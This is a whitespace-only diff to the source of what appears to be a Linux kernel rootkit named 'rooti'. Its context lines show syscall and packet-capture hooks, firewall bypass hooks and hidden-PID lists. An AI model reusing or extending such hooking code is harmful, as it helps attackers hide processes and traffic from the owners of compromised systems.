@@ -82,7 +82,7 @@ static asmlinkage long hook_pread64(const struct pt_regs *regs) {
     char *user_buf = (char *)regs->si;
     size_t count = regs->dx;
     struct file *file;
-    
+
     size_t nread = orig_pread64(regs);
     if (nread < 0)
         return nread;
@@ -170,7 +170,7 @@ static int hook_packet_rcv(struct sk_buff *skb, struct net_device *dev,
         return orig_packet_rcv(skb, dev, pt, orig_dev);
     default:
         BUG();
-    }    
+    }
 }
 
 static int hook_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
@@ -188,7 +188,7 @@ static int hook_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
         return orig_tpacket_rcv(skb, dev, pt, orig_dev);
     default:
         BUG();
-    }    
+    }
 }
 
 // Should really be flagged as noreturn but that raises an objtool warning
@@ -295,7 +295,7 @@ static void __exit rooti_exit(void)
 
     rooti_uninstall_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
     rooti_uninstall_fw_bypass_hooks();
-    
+
     // Release any remaining records
     rooti_pid_list_clear(&rooti_hidden_pids);
     rooti_pid_list_clear(&rooti_lifetime_bound_pids);
